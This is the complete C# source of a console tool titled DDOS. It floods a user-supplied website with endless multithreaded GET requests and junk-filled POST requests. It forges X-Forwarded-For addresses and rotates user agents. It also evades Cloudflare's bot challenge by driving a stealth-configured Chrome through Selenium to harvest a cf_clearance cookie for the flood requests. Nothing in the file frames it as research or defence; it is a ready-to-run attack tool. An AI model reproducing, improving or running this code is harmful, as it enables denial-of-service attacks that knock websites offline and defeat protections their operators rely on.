using OpenQA.Selenium.Chrome;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;

namespace DDOS
{
    internal class Program
    {
        public static long success = 0;
        public static long error = 0;
        public static Random rand = new Random();
        public static ChromeDriver driver = null;
        public static string userAgent = "";
        public static string cookieCloudflare = "";
        public static bool isStartGetCookie = false;
        public static Stopwatch stopwatch = new Stopwatch();
        public static string GetCookieCloudflare(ChromeDriver driver, string web)
        {
            while (true)
            {
                try
                {
                    driver.Manage().Cookies.DeleteAllCookies();
                    driver.ExecuteScript("window.open('" + web + "');");
                    Thread.Sleep(1000);
                    driver.SwitchTo().Window(driver.WindowHandles[0]).Close();
                    Thread.Sleep(1000);
                    driver.SwitchTo().Window(driver.WindowHandles[0]);
                    for (var i = 0; i < 15; i++)
                    {
                        foreach (var cok in driver.Manage().Cookies.AllCookies)
                        {
                            if (cok.Name == "cf_clearance" && !string.IsNullOrEmpty(cok.Value))
                            {
                                userAgent = driver.ExecuteScript("return navigator.userAgent;")?.ToString();
                                return $"cf_clearance={cok.Value};";
                            }
                        }
                        Thread.Sleep(1000);
                    }
                }
                catch { if (driver == null) return ""; }
            }
        }
        public static bool isLiveCloudflareCookie(string web, string cookie)
        {
            try
            {
                SpeedRequest.HttpRequest http = new SpeedRequest.HttpRequest();
                http.IgnoreProtocolErrors = true;
                http.UserAgent = Leaf.xNet.Http.RandomUserAgent();
                if (!string.IsNullOrEmpty(cookie)) http.AddHeaders("cookie", cookie);
                http.Headers = new SpeedRequest.Headers[] { };
                var response = http.Get(web);
                foreach (var item in http.Get(web).HeadersResponse)
                {
                    if (item.Name.ToLower().Contains("server") && item.Value.ToLower().Contains("cloudflare") && (response.StatusCode == "ServiceUnavailable" || response.StatusCode == "Forbidden") && response.Html.Contains("Cloudflare</title>"))
                    {
                        return !item.Name.ToLower().Contains("server") && item.Value.ToLower().Contains("cloudflare") && (response.StatusCode == "ServiceUnavailable" || response.StatusCode == "Forbidden") && response.Html.Contains("Cloudflare</title>");
                    }    
                }
                return false;
            }
            catch
            {
                return false;
            }
        }
        public static string GetDomain(string uri)
        {
            try
            {
                Uri url = new Uri(uri);
                return url.Host;
            }
            catch
            {
                return null;
            }
        }
        public static bool IsInt(string int_)
        {
            try
            {
                int.Parse(int_);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rand.Next(s.Length)]).ToArray());
        }
        public static string GeneratorPostData()
        {
            string result = "";
            for (var i = 0; i < rand.Next(150, 200); i++) result += RandomString(rand.Next(20, 50));
            return result;
        }
        public static void DDOS(string url, int timeout)
        {
            while (true)
            {
                try
                {
                    if (isStartGetCookie) return;
                    SpeedRequest.HttpRequest http = new SpeedRequest.HttpRequest();
                    http.IgnoreProtocolErrors = true;
                    http.Timeout = timeout;
                    http.ContinueTimeout = timeout;
                    http.ReadWriteTimeout = timeout;
                    http.Headers = new SpeedRequest.Headers[] { };
                    string[] type = { "application/x-www-form-urlencoded", "application/json", "text/plain" };
                    if (string.IsNullOrEmpty(userAgent))
                    {
                        http.UserAgent = Leaf.xNet.Http.RandomUserAgent();
                    }
                    else
                    {
                        http.UserAgent = userAgent;
                        http.AddHeaders("cookie", cookieCloudflare);
                    }
                    http.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                    http.AddHeaders("Upgrade-Insecure-Requests", "1");
                    http.AddHeaders("Accept-Language", "en-US,en;q=0.9");
                    string ip = rand.Next(1, 256) + "." + rand.Next(0, 256) + "." + rand.Next(0, 256) + "." + rand.Next(0, 256);
                    http.AddHeaders("X-Forwarded-For", ip);
                    SpeedRequest.HttpResponse response;
                    if (rand.Next(0, 3) == 1) response = http.Get(url);
                    else response = http.Post(url, SpeedRequest.Method.POST, type[rand.Next(type.Length)], GeneratorPostData());
                    foreach (var item in response.HeadersResponse)
                    {
                        if (isStartGetCookie == false && item.Name.ToLower().Contains("server") && item.Value.ToLower().Contains("cloudflare") && (response.StatusCode == "ServiceUnavailable" || response.StatusCode == "Forbidden") && response.Html.Contains("Cloudflare</title>"))
                        {
                            isStartGetCookie = true;
                            cookieCloudflare = GetCookieCloudflare(driver, url);
                            isStartGetCookie = false;
                            goto DONE;
                        }    
                    }
                    success++;
                DONE:;
                }
                catch { error++; }
            }
        }
        public static ChromeDriver OpenChrome()
        {
            try
            {
                ChromeDriverService chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;
                ChromeOptions chromeOptions = new ChromeOptions();
                chromeOptions.AddExcludedArgument("enable-automation");
                chromeOptions.AddArguments("--disable-notifications");
                chromeOptions.AddArgument("--disable-ipv6");
                chromeOptions.AddArgument("--disable-dev-shm-usage");
                chromeOptions.AddArgument("--disable-impl-side-painting");
                chromeOptions.AddArgument("--disable-setuid-sandbox");
                chromeOptions.AddArgument("--disable-seccomp-filter-sandbox");
                chromeOptions.AddArgument("--disable-breakpad");
                chromeOptions.AddArgument("--disable-client-side-phishing-detection");
                chromeOptions.AddArgument("--disable-cast");
                chromeOptions.AddArgument("--disable-cast-streaming-hw-encoding");
                chromeOptions.AddArgument("--disable-cloud-import");
                chromeOptions.AddArgument("--disable-popup-blocking");
                chromeOptions.AddArgument("--ignore-certificate-errors");
                chromeOptions.AddArgument("--disable-session-crashed-bubble");
                chromeOptions.AddArgument("--allow-http-screen-capture");
                chromeOptions.AddArgument("--lang=vi");
                chromeOptions.AddArgument("--disable-blink-features=AutomationControlled");
                chromeOptions.AddArguments("excludeSwitches", "enable-automation");
                chromeOptions.AddArguments("useAutomationExtension", "false");
                chromeOptions.AddArgument("enable-automation");
                chromeOptions.AddArgument("--disable-web-security");
                chromeOptions.AddArgument("--allow-running-insecure-content");
                chromeOptions.AddArguments(new string[]
                {
                    "--disable-3d-apis",
                    "--disable-background-networking",
                    "--disable-bundled-ppapi-flash",
                    "--disable-client-side-phishing-detection",
                    "--disable-hang-monitor",
                    "--disable-prompt-on-repost",
                    "--disable-sync",
                    "--disable-webgl",
                    "--enable-blink-features=ShadowDOMV0",
                    "--disable-notifications",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-web-security",
                    "--disable-rtc-smoothness-algorithm",
                    "--disable-webrtc-hw-decoding",
                    "--disable-webrtc-hw-encoding",
                    "--disable-webrtc-multiple-routes",
                    "--disable-webrtc-hw-vp8-encoding",
                    "--enforce-webrtc-ip-permission-check",
                    "--force-webrtc-ip-handling-policy",
                    "--ignore-certificate-errors",
                    "--disable-infobars",
                    "--disable-popup-blocking"
                });
                chromeOptions.AddUserProfilePreference("profile.default_content_setting_values.geolocation", 0);
                chromeOptions.AddArgument("--mute-audio");
                chromeOptions.AddArgument("--disable-blink-features=AutomationControlled");
                chromeOptions.AddAdditionalCapability("useAutomationExtension", false);
                chromeOptions.AddUserProfilePreference("credentials_enable_service", false);
                return new ChromeDriver(chromeDriverService, chromeOptions, TimeSpan.FromSeconds(180.0));
            }
            catch (Exception)
            {
                return null;
            }
        }
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.InputEncoding = Encoding.UTF8;
            Console.Title = "DDOS  | Success: 0 | Error: 0 | Not Running...";
            Colorful.Console.WriteAscii("DDOS", Color.Cyan);
            Console.ForegroundColor = ConsoleColor.DarkGray;
            string link_web = null;
            var thread_ = "";
            int thread = 0;
            var timeout_ = "";
            int timeout = 0;
            do
            {
                Console.Write("[?] Link Web: ");
                link_web = Console.ReadLine();
            }
            while (GetDomain(link_web) == null);
            do
            {
                Console.Write("[?] Thread: ");
                thread_ = Console.ReadLine();
            }
            while (IsInt(thread_) == false);
            do
            {
                Console.Write("[?] Timeout: ");
                timeout_ = Console.ReadLine();
            }
            while (IsInt(timeout_) == false || int.Parse(timeout_) < 100);
            thread = int.Parse(thread_);
            timeout = int.Parse(timeout_);
            SpeedRequest.HttpRequest http = new SpeedRequest.HttpRequest();
            http.IgnoreProtocolErrors = true;
            http.UserAgent = Leaf.xNet.Http.RandomUserAgent();
            var response = http.Get(link_web);
            foreach (var item in response.HeadersResponse)
            {
                if (item.Name.ToLower().Contains("server") && item.Value.ToLower().Contains("cloudflare") && (response.StatusCode == "ServiceUnavailable" || response.StatusCode == "Forbidden") && response.Html.Contains("Cloudflare</title>"))
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[!] ByPass Cloudflare");
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    driver = OpenChrome();
                    cookieCloudflare = GetCookieCloudflare(driver, link_web);
                }
            }
            Thread thread__ = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(500);
                    Console.Title = $"DDOS  | Success: {success} | Error: {error} | Running...";
                }    
            });
            thread__.IsBackground = false;
            thread__.Start();
            stopwatch.Start();
            for (var i = 0; i < thread; i++)
            {
                Thread th = new Thread(() =>
                {
                    DDOS(link_web, timeout);
                });
                th.IsBackground = false;
                th.Start();
            }
            Console.ReadKey();
        }
    }
}
